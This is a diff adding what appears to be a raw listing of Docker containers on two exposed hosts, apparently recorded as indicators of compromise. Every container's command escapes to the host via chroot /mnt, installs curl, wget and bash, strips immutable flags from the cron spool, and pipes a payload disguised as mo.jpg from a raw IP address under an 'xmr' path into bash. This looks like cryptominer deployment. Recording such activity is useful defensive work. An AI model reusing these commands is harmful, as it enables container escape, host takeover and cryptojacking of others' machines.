@@ -1,0 +1,32 @@
+129.204.153.23
+
+	Image: ubuntu
+	ID: 893696f3d54c81065015f86edfe037606a3b5321a5b3c638973f46ccac4c9b30
+	Command: chroot /mnt sh -c 'apt-get update; apt-get install -y wget curl bash; yum install -y wget curl bash; curl http://129.211.98.236/xmr/mo/mo.jpg | bash'	Created:1596620273
+Names:
+	/hardcore_goodall
+	Status: Up 5 days
+
+Image: alpine
+  ID: 80557da15f48997ad8fb7fcde036a417d92c37b0c53c8c6654ae28c2f659e046
+  Command: chroot /mnt sh -c 'apk update; apk add curl wget bash; apt-get update; apt-get install -y curl wget bash; yum install -y curl wget bash; chattr -iR /var/spool/cron/; tntrecht -iR /var/spool/cron/; curl http://129.211.98.236/xmr/mo/mo.jpg | bash || wget -O - http://129.211.98.236/xmr/mo/mo.jpg | bash'	Created:1596260031
+  Names:
+    /naughty_bohr
+Status: Up 9 days
+
+Image: alpine
+  ID: cdab827ee590eb138c297ae7b3d2482c9bf2b5c7c8a00d3510b3a6c7fc8d0e3a
+  Command: chroot /mnt sh -c 'apt-get install -y curl bash wget; yum install -y curl bash wget; apk update; apk add curl bash wget; curl http://129.211.98.236/xmr/mo/mo.jpg | bash; '	Created:1596211322
+  Names:
+    /sleepy_golick
+Status: Up 10 days
+
+
+106.13.164.178
+
+Image: alpine
+ID: 9c0192da577a13798d1ec3a5ca74b8024e1f102444498a78b8faddf8c1ca1e25
+Command: chroot /mnt sh -c 'apk update; apk add curl wget bash; apt-get update; apt-get install -y curl wget bash; yum install -y curl wget bash; chattr -iR /var/spool/cron/; tntrecht -iR /var/spool/cron/; curl http://129.211.98.236/xmr/mo/mo.jpg | bash || wget -O - http://129.211.98.236/xmr/mo/mo.jpg | bash'	Created:1596378576
+Names:
+/kickass_volhard
+Status: Up 17 hours
